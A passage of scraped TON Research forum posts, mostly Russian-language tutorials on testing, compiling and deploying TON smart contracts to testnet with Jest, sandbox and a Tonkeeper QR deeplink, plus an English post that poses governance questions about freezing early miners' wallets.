describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");

		const sentMessageResult = await myContract.sendInternalMessage(senderWallet.getSender(),toNano("0.05"));

		expect(sentMessageResult.transactions).toHaveTransaction({
			from: senderWallet.address,
			to: myContract.address,
			success: true,
		});

		const getData = await myContract.getData();

		expect(getData.recent_sender.toString()).toBe(senderWallet.address.toString());

	});
});
```

Запустите тесты, написав в консоли: `yarn test`. Если вы все сделали правильно, вы должны увидеть:

```
Pass
Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
```

Осталось проверить равенств сохраненных значений, проверим с помощью `toEqual()`:

```
import { Cell, Address, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";
import "@ton-community/test-utils";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");

		const sentMessageResult = await myContract.sendInternalMessage(senderWallet.getSender(),toNano("0.05"));

		expect(sentMessageResult.transactions).toHaveTransaction({
			from: senderWallet.address,
			to: myContract.address,
			success: true,
		});

		const getData = await myContract.getData();

		expect(getData.recent_sender.toString()).toBe(senderWallet.address.toString());
		expect(getData.number).toEqual(1); 
	});
});
```

## [](#conclusion-4)Conclusion

Тесты пройдены и нужно деплоить контракт в сеть, в следующем туториале мы сделаем удобную систему деплоя.

[github.com](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/simpletest.md)

#### [romanovichim/TonFunClessons\_ru/blob/main/lessons/pipeline/simpletest.md](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/simpletest.md)

````
# Smart Contract Pipeline Part2 - Тестирование смарт-контракта

## Вступление

В [первой части](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/simplesmartcontract.md) мы рассмотрели каркас проекта и написали простой смарт-контракт, пришло время тестов.

## Начнем работать над тестами

Для тестов нам понадобится фреймворк для тестирования, в нашем случае это будет [jest](https://jestjs.io), также нам нужно эмулировать работу блокчейна, для этого мы будем использовать [ton-community/sandbox ](https://github.com/ton-community/sandbox). Устанавливаем:
```bash
yarn add @ton-community/sandbox jest ts-jest @types/jest ton --dev
```
Чтобы использовать jest framework, вам нужен файл конфигурации. Создадим файл jets.config.js и добавим туда:
```js
	/** @type {import('ts-jest').JestConfigWithTsJest} */
	module.exports = {
	  preset: 'ts-jest',
	  testEnvironment: 'node',
	};
```
````

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/simpletest.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 469

[TON Research](/)

# [Разбираемся в Pipeline работы со смарт-контрактами - Урок 3 Деплоим смарт-контракт используя QR-код](/t/pipeline-3-qr/469)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:51pm  1

# [](#smart-contract-pipeline-part3-1)Smart Contract Pipeline Part3 - Удобный деплой в тестовую сеть

## [](#h-2)Вступление

В первых двух частях мы разбирали [компиляцию](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/simplesmartcontract.md) и [тестирование](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/simpletest.md), в этом туториале мы сделаем удобный деплой нашего контракта в тестовую сеть, для этого сгенерируем ссылку для деплоя, которую представим в виде QR кода, просканируем код кошельком и таким образом, задеплоим контракт.

Может возникнуть вопрос, что за ссылка для деплоя? - для деплоя смарт-контракта нужно отправить сообщение с данными о контракте, сделаем это следующим образом, сформируем \[deeplink\](https:/ /github.com/tonkeeper/wallet-api) для кошелька Tonkeeper в этот диплинк мы будем передавать все данные для деплоя и далее по ссылке можно будет сделать QR, который при сканировании кошельком будет деплоить контракт, передавая всю информацию в блокчейн.

## [](#h-3)Скрипт деплоя

Давайте создадим отдельный файл для деплоя в тестовой сети `deploy.ts`.

### [](#stateinit-4)StateInit

[StateInit](https://docs.ton.org/develop/data-formats/msg-tlb#stateinit-tl-b) служит для доставки исходных данных в контракт и используется при развертывании контракта.

Верхнеуровнево для развертывания в тестовой или основной сети нам нужно отправить в сеть сообщение с StateInit. `StateInit` состоит из ячейки с кодом и ячейки с данными, а адрес смарт-контракта примерно равен: `hash(исходный код, начальное состояние)`.

Давайте соберем `StateInit` и отправим сообщение для деплоя.

В файле `deploy.ts` создайте функцию `deployContract()`:

```
async function deployContract() {
}

deployContract()
```

Сделаем импорт нужных доп функций из `ton-core`, а также нашего смарт-контракта в `hex` формате:

```
import { Cell, StateInit, beginCell, contractAddress, storeStateInit, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";

async function deployContract() {
}

deployContract()
```

Ячейку с кодом мы получим из `hex` представления контракта, стартовых данных не будет – создаем пустую ячейку. Теперь у нас готовы данные для формирования `StateInit`

```
import { Cell, StateInit, beginCell, contractAddress, storeStateInit, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";

async function deployContract() {
	const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];
	const dataCell = new Cell();   

	const stateInit: StateInit = {
		code: codeCell,
		data: dataCell,
	};
}

deployContract()
```

Теперь нам нужно собрать `StateInit`, сначала создав `Builder` (биты данных и ссылки на другие ячейки можно хранить в `Builder`, а затем `Builder` можно превратить в новую ячейку.), но мы используем вспомогательные функции из `ton-core` например `storeStateInit`, получаем:

```
import { Cell, StateInit, beginCell, contractAddress, storeStateInit, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";

async function deployContract() {
	const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];
	const dataCell = new Cell();   

	const stateInit: StateInit = {
		code: codeCell,
		data: dataCell,
	};
	
	const stateInitBuilder = beginCell();
	storeStateInit(stateInit)(stateInitBuilder);
	const stateInitCell = stateInitBuilder.endCell();

}

deployContract()
```

Выше мы сказали, что получить адрес можно из исходных данных, сделаем это с помощью `contractAddress`:

```
import { Cell, StateInit, beginCell, contractAddress, storeStateInit, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";

async function deployContract() {
	const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];
	const dataCell = new Cell();   

	const stateInit: StateInit = {
		code: codeCell,
		data: dataCell,
	};

	const stateInitBuilder = beginCell();
	storeStateInit(stateInit)(stateInitBuilder);
	const stateInitCell = stateInitBuilder.endCell();

	const address = contractAddress(0, {
		code: codeCell,
		data: dataCell,
	});

}

deployContract()
```

### [](#qr-5)QR код

Приступим к формированию строки для развертывания контракта:

Установите библиотеку для удобной генерации строк

```
yarn add qs @types/qs --dev
```

И библиотека для генерации QR-кода.

```
yarn add qrcode-terminal @types/qrcode-terminal --dev
```

Для отправки сообщения нам нужно использовать deeplink [/transfer](https://github.com/tonkeeper/wallet-api#payment-urls):

```
ton://transfer/<address>
ton://transfer/<address>?amount=<nanocoins>
ton://transfer/<address>?text=<url-encoded-utf8-text>
ton://transfer/<address>?bin=<url-encoded-base64-boc>
ton://transfer/<address>?bin=<url-encoded-base64-boc>&init=<url-encoded-base64-boc>

https://app.tonkeeper.com/transfer/<address>
https://app.tonkeeper.com/transfer/<address>?amount=<nanocoins>
https://app.tonkeeper.com/transfer/<address>?text=<url-encoded-utf8-text>
https://app.tonkeeper.com/transfer/<address>?bin=<url-encoded-base64-boc>
https://app.tonkeeper.com/transfer/<address>?bin=<url-encoded-base64-boc>&init=<url-encoded-base64-boc>
```

С помощью библиотеки qs соберем следующую строку:

```
    let deployLink =
   	'https://app.tonkeeper.com/transfer/' +
   	address.toString({
   		testOnly: true,
   	}) +
   	"?" +
   	qs.stringify({
   		text: "Deploy contract by QR",
   		amount: toNano("0.1").toString(10),
   		init: stateInitCell.toBoc({idx: false}).toString("base64"),
   	});
```

Теперь QR код:

```
	qrcode.generate(deployLink, {small: true }, (qr) => {
		console.log(qr);
	});
```

В конце сгенерируем ссылку на обозреватель блокчейна в тестовой сети, для нашего удобства — после развёртывания мы увидим, что контракт готов.

Окончательный код

```
import { Cell, StateInit, beginCell, contractAddress, storeStateInit, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import qs from "qs";
import qrcode from "qrcode-terminal";

async function deployContract() {
	const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];
	const dataCell = new Cell();   

	const stateInit: StateInit = {
		code: codeCell,
		data: dataCell,
	};

	const stateInitBuilder = beginCell();
	storeStateInit(stateInit)(stateInitBuilder);
	const stateInitCell = stateInitBuilder.endCell();

	const address = contractAddress(0, {
		code: codeCell,
		data: dataCell,
	});


	let deployLink =
		'https://app.tonkeeper.com/transfer/' +
		address.toString({
			testOnly: true,
		}) +
		"?" +
		qs.stringify({
			text: "Deploy contract by QR",
			amount: toNano("0.1").toString(10),
			init: stateInitCell.toBoc({idx: false}).toString("base64"),
		});

	qrcode.generate(deployLink, {small: true }, (qr) => {
		console.log(qr);
	});

	let scanAddr = 
		'https://testnet.tonscan.org/address/' +
		address.toString({
			testOnly: true,
		})

	console.log(scanAddr);

	}

deployContract()
```

Обновите файл `package.json`, добавив `"deploy": "yarn compile && ts-node ./scripts/deploy.ts"` в скрипты:

```
{
  "name": "test_folder",
  "version": "1.0.0",
  "main": "index.js",
  "license": "MIT",
  "devDependencies": {
	"@swc/core": "^1.3.63",
	"@ton-community/func-js": "^0.6.2",
	"@ton-community/sandbox": "^0.11.0",
	"@types/jest": "^29.5.2",
	"@types/node": "^20.3.1",
	"@types/qrcode-terminal": "^0.12.0",
	"@types/qs": "^6.9.7",
	"jest": "^29.5.0",
	"qrcode-terminal": "^0.12.0",
	"qs": "^6.11.2",
	"ton": "^13.5.0",
	"ton-core": "^0.49.1",
	"ton-crypto": "^3.2.0",
	"ts-jest": "^29.1.0",
	"ts-node": "^10.9.1",
	"typescript": "^5.1.3"
 },
  "scripts": {
	"compile": "ts-node ./scripts/compile.ts",
	"test": "yarn jest",
	"deploy": "yarn compile && ts-node ./scripts/deploy.ts"
  },
  "dependencies": {
	"@ton-community/test-utils": "^0.2.0"
  }
}
```

Осталось все это запустить:

1.  в консоли набираем команду yarn deploy
2.  отсканируйте QR-код в Tonkeeper, переключенном на тестовую сеть
3.  подтвердите транзакцию
4.  смотрим в эксплорере что контракт развернуть

## [](#h-6)Заключение

Спасибо за внимание, в двух следующих туторилах мы уделим внимание сообщениям, от чего отталкиваться при написании тестов и как писать тесты для тестовой сети.

[github.com](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/simpledeploy.md)

#### [romanovichim/TonFunClessons\_ru/blob/main/lessons/pipeline/simpledeploy.md](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/simpledeploy.md)

```
# Smart Contract Pipeline Part3 - Удобный деплой в тестовую сеть

## Вступление

В первых двух частях мы разбирали [компиляцию](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/simplesmartcontract.md) и [тестирование](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/simpletest.md), в этом туториале мы сделаем удобный деплой нашего контракта в тестовую сеть, для этого сгенерируем ссылку для деплоя, которую представим в виде QR кода, просканируем код кошельком и таким образом, задеплоим контракт.

Может возникнуть вопрос, что за ссылка для деплоя? - для деплоя смарт-контракта нужно отправить сообщение с данными о контракте, сделаем это следующим образом, сформируем [deeplink](https:/ /github.com/tonkeeper/wallet-api) для кошелька Tonkeeper в этот диплинк мы будем передавать все данные для деплоя и далее по ссылке можно будет сделать QR, который при сканировании кошельком будет деплоить контракт, передавая всю информацию в блокчейн.

## Скрипт деплоя

Давайте создадим отдельный файл для деплоя в тестовой сети `deploy.ts`.

### StateInit

[StateInit](https://docs.ton.org/develop/data-formats/msg-tlb#stateinit-tl-b) служит для доставки исходных данных в контракт и используется при развертывании контракта.
 
Верхнеуровнево для развертывания в тестовой или основной сети нам нужно отправить в сеть сообщение с StateInit. `StateInit` состоит из ячейки с кодом и ячейки с данными, а адрес смарт-контракта примерно равен: `hash(исходный код, начальное состояние)`.

Давайте соберем `StateInit` и отправим сообщение для деплоя.

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/simpledeploy.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 47

[TON Research](/)

# [Evaluating the Implications of Freezing Inactive First Miners' Accounts in the TON Blockchain](/t/evaluating-the-implications-of-freezing-inactive-first-miners-accounts-in-the-ton-blockchain/47)

[TON Blockchain](/c/ton-blockchain/17) 

    

[TFR](https://tonresear.ch/u/TFR)  January 23, 2024, 2:03pm  1

The TON (Telegram Open Network) blockchain community is currently contemplating a significant proposal to freeze wallets belonging to the first miners of the network for 48 months. This decision, which involves a substantial amount of TON coins totaling 1,081,425,847, raises critical questions about the principles of decentralization, the distribution of power in blockchain networks, and the potential long-term impacts on the TON ecosystem. Given the complexities of this situation, a comprehensive analysis is required to understand the various facets and consequences of such an action.

This inquiry seeks to explore and analyze the proposed freezing of inactive first miners’ accounts in the TON blockchain, focusing on several key aspects:

1.  **Context and Rationale for the Proposal**: What are the underlying reasons for proposing the freeze of first miners’ wallets, and how does this relate to the current distribution and circulation of TON coins within the network?
2.  **Impact on Network Decentralization and Empowerment**: How would the implementation of this freeze affect the TON blockchain’s decentralization, particularly in contrast to the Web3 vision and the empowerment of individual network participants?
3.  **Comparison with Other Cryptocurrencies**: How does this proposed action compare with the handling of large, inactive wallets in other major cryptocurrencies like Bitcoin, especially in terms of regulatory interventions and community governance?
4.  **Potential Risks and Precedents**: What risks and precedents might this freeze set within the TON ecosystem and the broader blockchain community, particularly regarding the empowerment of certain groups over others and the potential for future address blocking mechanisms?
5.  **Impact on Investor Perception and Network Liquidity**: How might the freeze influence investor perception of the TON blockchain, especially concerning network liquidity and the risk of centralized control over wallet addresses?
6.  **Voting Process and Validator Influence**: Given the current dynamics of the TON network, particularly the role of validators and major coin holders, how might the voting process for this proposal unfold, and what are the implications for the network’s claim to decentralization?
7.  **Long-term Implications for TON’s Ecosystem**: What are the potential long-term consequences of this decision on the TON ecosystem, including the future of blockchain governance, investor confidence, and network stability?

This analysis aims to provide a nuanced understanding of the potential freeze of inactive first miners’ accounts in the TON blockchain, exploring its implications for network governance, decentralization, and the future trajectory of the TON ecosystem.

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 470

[TON Research](/)

# [Разбираемся в Pipeline работы со смарт-контрактами - Урок 4 Чат-бот смарт-контракт](/t/pipeline-4/470)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[func](https://tonresear.ch/tag/func), [learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:51pm  1

# [](#chatbot-smart-contract-1)Chatbot Smart Contract

## [](#h-2)Вступление

В данном туториале мы разберем смарт-контракт чат-бот. Который понадобиться нам для того, чтобы разобраться как смотерть транзакции в тестах и для onchain тестов.

## [](#ton-3)Про TON

TON представляет собой [модель актора](https://en.wikipedia.org/wiki/Actor_model) - это математическая модель параллельных вычислений, которая лежит в основе смарт-контрактов TON. В нем каждый смарт-контракт может получить одно сообщение, изменить собственное состояние или отправить одно или несколько сообщений в единицу времени.

Чаще всего для создания полноценного приложения на TON нужно писать несколько смарт-контрактов, которые как бы общаются друг с другом с помощью сообщений. Чтобы контракт понимал, что ему надо делать, когда в него приходит сообщение, рекомендуется использовать `op`. `op` - 32-битный идентификатор, который стоит передавать в теле сообщения.

Таким образом, внутри сообщения с помощью условных операторов, в зависимоти от смарт-контракт `op` выполняет разные действия.

Поэтому важно уметь тестировать сообщения, чем мы сегодня и займемся.

Смарт-контракт чат-бот получает любое internal сообщение и отвечает на него internal сообщение с текстом reply.

## [](#h-4)Разбираем контракт

##### [](#h-5)Стандартная бибилиотека

Первое, что надо сделать, это [импортировать стандартную библиотеку](https://ton-blockchain.github.io/docs/#/func/stdlib). Библиотека представляет собой просто оболочку для наиболее распространенных команд TVM (виртуальной машины TON), которые не являются встроенными.

```
#include "imports/stdlib.fc";
```

Для обработки внутренних сообщений, нам понадобиться метод`recv_internal()`

```
() recv_internal()  {

}
```

##### [](#h-6)Аргументы внешнего метода

Здесь возникает логичный вопрос - как понять какие аргументы должны быть у фукнции, чтобы она могла принимать сообщения в сети TON?

В соответствии с документацией [виртуальной машины TON - TVM](https://ton-blockchain.github.io/docs/tvm.pdf), когда на счете в одной из цепочек TON происходит какое-то событие, оно вызывает транзакцию.

Каждая транзакция состоит из до 5 этапов. Подробнее [здесь](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=transactions-and-phases).

Нас интересует **Compute phase**. А если быть конкретнее, что “в стеке” при инициализации. Для обычных транзакций, вызванных сообщением, начальное состояние стека выглядит следующим [образом](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=initialization-of-tvm):

5 элементов:

*   Баланс смарт-контракта(в наноТонах)
*   Баланс входящего сообщения (в наноТонах)
*   Ячейка с входящим сообщеним
*   Тело входящего сообщения, тип слайс
*   Селектор функции (для recv\_internal это 0)

```
() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body)  {

}
```

Но необъязательно прописывать все аргументы `recv_internal()`. Устанавливая аргументы в `recv_internal()`, мы сообщаем коду смарт-контракта о некоторых из них. Те аргументы, о которых код не будет знать, будут просто лежать на дне стека, так и не тронутые. Для нашего смарт-контракта это:

```
	() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {

	}
```

##### [](#h-7)Газ для обработки сообщений

Нашему смарт-контракту нужно будет использовать газ для дальнейшей отправки сообщения, поэтому будем проверять с каким msg\_value пришло сообщение, если оно очень маленькое ( меньше 0.01 TON) закончим выполнение смарт-контракта с помощью `return()`.

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {

  if (msg_value < 10000000) { ;; 10000000 nanoton == 0.01 TON
	return ();
  }
  
}
```

##### [](#h-8)Достаем адрес

Чтобы отправить сообщение обратно, нужно достать адрес того, кто нам его отправил. Для этого нужно разобрать ячейку `in_msg`.

Чтобы мы могли взять адрес, нам необходимо преобразовать ячейку в слайс c помощью `begin_parse`:

```
var cs = in_msg_full.begin_parse();
```

Теперь нам надо “вычитать” до адреса полученный slice. С помощью `load_uint` функции из [стандартной бибилотеки FunC](https://ton-blockchain.github.io/docs/#/func/stdlib) она загружает целое число n-бит без знака из слайса, “вычитаем” флаги.

```
var flags = cs~load_uint(4);
```

В данном уроке мы не будем останавливаться подробно на флагах, но подробнее можно прочитать в пункте [3.1.7](https://ton-blockchain.github.io/docs/tblkch.pdf).

Ну и наконец-то адрес. Используем `load_msg_addr()` - которая загружает из слайса единственный префикс, который является допустимым MsgAddress.

```
slice sender_address = cs~load_msg_addr(); 
```

Получаем:

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {

  if (msg_value < 10000000) { ;; 10000000 nanoton == 0.01 TON
	return ();
  }
  
  slice cs = in_msg.begin_parse();
  int flags = cs~load_uint(4); 
  slice sender_address = cs~load_msg_addr(); 

}
```

##### [](#h-9)Отправка сообщения

Теперь нужно отправить сообщение обратно

##### [](#h-10)Структура сообщения

С полной структурой сообщения можно ознакомиться [здесь - message layout](https://ton-blockchain.github.io/docs/#/smart-contracts/messages?id=message-layout). Но обычно нам нет необходимости контролировать каждое поле, поэтому можно использовать краткую форму из [примера](https://ton-blockchain.github.io/docs/#/smart-contracts/messages?id=sending-messages):

```
 var msg = begin_cell()
	.store_uint(0x18, 6)
	.store_slice(addr)
	.store_coins(amount)
	.store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	.store_slice(message_body)
  .end_cell();
```

Как вы можете видеть для построения сообщения используются функции [стандартной библиотеки FunC](https://ton-blockchain.github.io/docs/#/func/stdlib). А именно фукнции “обертки” примитивов Builder (частично построенных ячеек как вы можете помнить из первого урока). Рассмотрим:

`begin_cell()` - создаст Builder для будущей ячейки  
`end_cell()` - создаст Cell (ячейку)  
`store_uint` - сохранит uint в Builder  
`store_slice` - сохранит слайс в Builder  
`store_coins`\- здесь в документации имеется ввиду `store_grams` - используемой для хранения TonCoins. Подробнее [здесь](https://ton-blockchain.github.io/docs/#/func/stdlib?id=store_grams).

##### [](#message-body-11)Message body

В тело сообщения мы положим `op` и наше сообщение `reply`, чтобы положить сообщение, нужно сделать `slice`.

```
slice msg_text = "reply";
```

В рекомендациях о теле сообщения, есть рекомендация добавлять `op`, несмотря на то, что здесь он не будет нести, какой-то функциональности, мы его добавим.

Чтобы мы могли создавать подобие клиент-серверной архитектуры на смарт-контрактах описанной в рекомендациях, предлагается начинать каждое сообщение(строго говоря тело сообщения) с некоторого флага `op`, который будет идентифицировать какую операцию должен выполнить смарт-контракт.

Положим в наше сообщение `op` равный 0.

Получим:

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {

  if (msg_value < 10000000) { ;; 10000000 nanoton == 0.01 TON
	return ();
  }
	  
  slice cs = in_msg.begin_parse();
  int flags = cs~load_uint(4); 
  slice sender_address = cs~load_msg_addr(); 

  slice msg_text = "reply"; 

  cell msg = begin_cell()
	  .store_uint(0x18, 6)
	  .store_slice(sender_address)
	  .store_coins(100) 
	  .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	  .store_uint(0, 32)
	  .store_slice(msg_text) 
  .end_cell();

	}
```

Сообщение готово, отправим его.

##### [](#mode-12)Режим отправки сообщения(mode)

Для отправки сообщений используется `send_raw_message` из [стандартной библиотеки](https://ton-blockchain.github.io/docs/#/func/stdlib?id=send_raw_message).

Переменную msg мы уже собрали, остается разобраться `mode`. Описание каждого режиме есть в [документации](https://ton-blockchain.github.io/docs/#/func/stdlib?id=send_raw_message). Мы же рассмотрим на примере, чтобы было понятнее.

Пускай на балансе смарт-контракта 100 монет и мы получаем internal message c 60 моентами и отсылаем сообщение с 10, общий fee 3.

`mode = 0` - баланс (100+60-10 = 150 монет), отправим(10-3 = 7 монет)  
`mode = 1` - баланс (100+60-10-3 = 147 монет), отправим(10 монет)  
`mode = 64` - баланс (100-10 = 90 монет), отправим (60+10-3 = 67 монет)  
`mode = 65` - баланс (100-10-3=87 монет), отправим (60+10 = 70 монет)  
`mode = 128` -баланс (0 монет), отправим (100+60-3 = 157 монет)

Как мы выберем `mode`, пойдем по [документации](https://docs.ton.org/develop/smart-contracts/messages#message-modes):

*   Мы отправляем обычное сообщение, значит mode 0.
*   Оплачивайть комиссию за перевод будем отдельно от стоимости сообщения, значит +1.
*   Будем также игнорировать любые ошибки, возникающие при обработке этого сообщения на action phase, значит +2.

Получаем `mode` == 3, итоговый смарт-контракт:

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {

  if (msg_value < 10000000) { ;; 10000000 nanoton == 0.01 TON
	return ();
  }
	  
  slice cs = in_msg.begin_parse();
  int flags = cs~load_uint(4); 
  slice sender_address = cs~load_msg_addr(); 

  slice msg_text = "reply"; 

  cell msg = begin_cell()
	  .store_uint(0x18, 6)
	  .store_slice(sender_address)
	  .store_coins(100) 
	  .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	  .store_uint(0, 32)
	  .store_slice(msg_text) 
  .end_cell();

  send_raw_message(msg, 3);
}
```

## [](#hexboc-13)hexBoC

Прежде чем деплоить смарт-контракт, нужно его скомпилировать в hexBoС, давайте возьмем проект из предыдущего туторила.

Переименуем `main.fc` в `chatbot.fc` и запишем в него наш смарт-контракт.

Так как мы изменили имя файла, нужно модернизировать и `compile.ts`:

```
import * as fs from "fs";
import { readFileSync } from "fs";
import process from "process";
import { Cell } from "ton-core";
import { compileFunc } from "@ton-community/func-js";

async function compileScript() {

	const compileResult = await compileFunc({
		targets: ["./contracts/chatbot.fc"], 
		sources: (path) => readFileSync(path).toString("utf8"),
	});

	if (compileResult.status ==="error") {
		console.log("Error happend");
		process.exit(1);
	}

	const hexBoC = 'build/main.compiled.json';

	fs.writeFileSync(
		hexBoC,
		JSON.stringify({
			hex: Cell.fromBoc(Buffer.from(compileResult.codeBoc,"base64"))[0]
				.toBoc()
				.toString("hex"),
		})

	);

	console.log("Compiled, hexBoC:"+hexBoC);

}

compileScript();
```

Скомпилируйте смарт-контракт командой `yarn compile`.

Теперь у вас есть `hexBoC` представление смарт-контракта.

## [](#h-14)Заключение

В следующем туториале мы напишем тесты.

[github.com](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/chatbot.md)

#### [romanovichim/TonFunClessons\_ru/blob/main/lessons/pipeline/chatbot.md](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/chatbot.md)

```
# Chatbot Smart Contract

## Вступление

В данном туториале мы разберем смарт-контракт чат-бот. Который понадобиться нам для того, чтобы разобраться как смотерть транзакции в тестах и для onchain тестов.

## Про TON 

TON представляет собой [модель актора](https://en.wikipedia.org/wiki/Actor_model) - это математическая модель параллельных вычислений, которая лежит в основе смарт-контрактов TON. В нем каждый смарт-контракт может получить одно сообщение, изменить собственное состояние или отправить одно или несколько сообщений в единицу времени.

Чаще всего для создания полноценного приложения на TON нужно писать несколько смарт-контрактов, которые как бы общаются друг с другом с помощью сообщений. Чтобы контракт понимал, что ему надо делать, когда в него приходит сообщение, рекомендуется использовать `op`. `op` - 32-битный идентификатор, который стоит передавать в теле сообщения.

Таким образом, внутри сообщения с помощью условных операторов, в зависимоти от смарт-контракт `op` выполняет разные действия.

Поэтому важно уметь тестировать сообщения, чем мы сегодня и займемся.

Смарт-контракт чат-бот получает любое internal сообщение и отвечает на него internal сообщение с текстом reply. 

## Разбираем контракт

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/chatbot.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 471

[TON Research](/)

# [Разбираемся в Pipeline работы со смарт-контрактами - Урок 5 Пишем onchain тесты в тестовой сети](/t/pipeline-5-onchain/471)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:52pm  1

# [](#chatbot-smart-contract-testing-1)Chatbot Smart Contract Testing

В данном туториале мы напишем тесты для смарт-контракта чат-бота. Основная задача, научиться рассматривать под лупой транзакции в `@ton-community/sandbox`, а также разобрать как делать тесты в тестовой сети или другими словами onchain тесты.

Начнем с обычных тестов.

## [](#h-2)Проверяем есть ли траназакция

Так как мы используем проект предыдущего туториала как шаблон, каркас тестов у нас уже есть, откроем файл `main.spec.ts` и удалим оттуда, все что касается GET метода:

```
import { Cell, Address, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";
import "@ton-community/test-utils";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");

		const sentMessageResult = await myContract.sendInternalMessage(senderWallet.getSender(),toNano("0.05"));

		expect(sentMessageResult.transactions).toHaveTransaction({
			from: senderWallet.address,
			to: myContract.address,
			success: true,
		});

	});
});
```

Мы видим, что на данный момент, проверяется, отправлена ли транзакция в наш смарт-контракт. Происходит, это благодаря объекту `sentMessageResult.transactions`. Давайте рассмотрим его пристально и разберемся, что мы может тестить опираясь на этот объект.

Если мы просто выведем в консоль этот объект, он будет состоять из большого количества raw информации, для удобства воспользуемся `flattenTransaction` из `@ton-community/test-utils`:

```
import { Cell, Address, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";
import "@ton-community/test-utils";
import { flattenTransaction } from "@ton-community/test-utils";



describe("msg test", () => {
	it("test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");

		const sentMessageResult = await myContract.sendInternalMessage(senderWallet.getSender(),toNano("0.05"));

		expect(sentMessageResult.transactions).toHaveTransaction({
			from: senderWallet.address,
			to: myContract.address,
			success: true,
		});

		const arr = sentMessageResult.transactions.map(tx => flattenTransaction(tx));
		console.log(arr)


	});
});
```

То, что вы видите в консоли, можно использовать для тестов, давайте проверим, что сообщение, которое отправил наш чат-бот, равно reply.

Сооберем сообщение, в соответсвии с тем, что мы собирали в смарт-контракте.

```
	let reply = beginCell().storeUint(0, 32).storeStringTail("reply").endCell();
```

Теперь, используя сообщения, проверим, что такая транзакция есть:

```
